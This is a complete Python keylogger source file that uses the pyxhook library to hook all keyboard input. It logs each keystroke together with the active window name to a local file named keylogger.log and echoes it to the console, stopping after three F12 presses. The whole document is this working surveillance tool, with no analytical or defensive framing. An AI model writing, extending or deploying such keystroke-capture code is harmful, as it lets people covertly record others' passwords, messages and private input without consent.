import pyxhook
import time

def stringreplace(s):
    global special_strings
    if(s==None):
        return ""
    elif(s in special_strings):
        return special_strings[s]
    return s

def keystroke(event):
    global flag, out, prev_window, running, text_file, count, sequence
    text_file = open("./keylogger.log", "a")
    if(count>0 and event.Key!="F12"):
        sequence, count = 0, 0

    if(flag==0):
        flag = flag+1
        out =  out + stringreplace(event.Key)
        prev_window = event.WindowName

    if(prev_window == event.WindowName):
        out =  out +stringreplace(event.Key)
    else:
        text_file.write(out+" [Window:" + prev_window+"]"+"\n")
        print(out+" [Window:" + prev_window+"]")
        flag, prev_window, out = 0, "", stringreplace(event.Key)
    
    if event.Key == "F12":
        count = count+1
        sequence = 1
        if(count==3):
            running = False
    text_file.close()
    
text_file = open("./keylogger.log", "a")
special_strings = {
    "BackSpace":"(back)", "Return":"(enter)", "space":"(space)", "Shift_R" :"(S_R)","Shift_L":"(S_L)", "Control_L":"(Ctrl_l)",
    "Tab":"(tab)","Control_R":"(Ctrl_R)", "Alt_R":"(Alt_r)", "Alt_L" :"(Alt_l)", "Left":"(left)", "Right":"(right)", "Up":"(up)",
    "Down": "(down)", "Escape":"(escape)", "Super_L":"(super)", "colon":":"
    }
flag, count, sequence, out, prev_window = 0, 0, 0, "", "" ,

if(__name__ == "__main__"):
    global running
    text_file.write("\n\n#######\nNew log\n#######\n\n")
    logger = pyxhook.HookManager()
    # Define our callback to fire when a key is pressed down
    logger.KeyDown = keystroke
    logger.__str__ = ""
    # Hook the keyboard
    logger.HookKeyboard()
    # Start our listener
    logger.start()

    running = True
    while(running):
        time.sleep(0.1)
    logger.cancel()